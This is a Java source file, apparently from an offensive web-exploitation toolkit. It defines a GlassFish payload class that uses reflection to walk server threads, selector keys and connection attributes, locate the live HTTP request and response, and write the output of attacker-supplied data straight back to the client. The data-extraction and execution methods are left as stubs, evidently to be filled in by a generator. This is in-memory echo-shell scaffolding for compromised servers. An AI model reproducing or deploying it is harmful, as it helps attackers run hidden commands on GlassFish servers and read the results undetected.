package com.reajason.javaweb.probe.payload.response;

import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Set;

/**
 * @author ReaJason
 * @since 2025/8/9
 */
public class GlassFishWriter {

    public GlassFishWriter() {
        try {
            try {
                // GlassFish3
                Thread thread = Thread.currentThread();
                Object request = invokeMethod(getFieldValue(getFieldValue(thread, "processorTask"), "request"), "getNote", new Class[]{Integer.TYPE}, new Object[]{1});
                Object response = invokeMethod(request, "getResponse", null, null);
                String data = getDataFromReq(request);
                if (data != null && !data.isEmpty()) {
                    execute(response, data);
                }
            } catch (Exception x) {
                // GlassFish4+
                Set<Thread> threads = Thread.getAllStackTraces().keySet();
                for (Thread thread : threads) {
                    Object blocker = getFieldValue(thread, "blocker");
                    if (blocker == null || !blocker.getClass().getName().contains("Selector")) {
                        continue;
                    }
                    Set<?> keys = (Set<?>) getFieldValue(getFieldValue(blocker, "this$0"), "keys");
                    for (Object key : keys) {
                        Object connection = getFieldValue(key, "attachment");
                        if (!connection.getClass().getName().contains("Connection")) {
                            continue;
                        }
                        Object attributes = getFieldValue(connection, "attributes");
                        Object coyoteRequest = invokeMethod(attributes, "getAttribute", new Class[]{String.class}, new Object[]{"HttpServerFilter.Request"});
                        if (coyoteRequest == null) {
                            continue;
                        }
                        Object notesHolder = getFieldValue(getFieldValue(coyoteRequest, "request"), "notesHolder");
                        Object request = invokeMethod(notesHolder, "getAttribute", new Class[]{String.class}, new Object[]{"org.apache.catalina.connector.Request"});
                        Object response = invokeMethod(request, "getResponse", null, null);
                        String data = getDataFromReq(request);
                        if (data != null && !data.isEmpty()) {
                            execute(response, data);
                            return;
                        }
                    }
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private void execute(Object response, String data) throws Exception {
        PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
        try {
            writer.write(run(data));
        } catch (Throwable e) {
            e.printStackTrace(writer);
        }
        writer.flush();
        writer.close();
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws Exception {
        Class<?> clazz = obj.getClass();
        while (clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException var5) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }
}
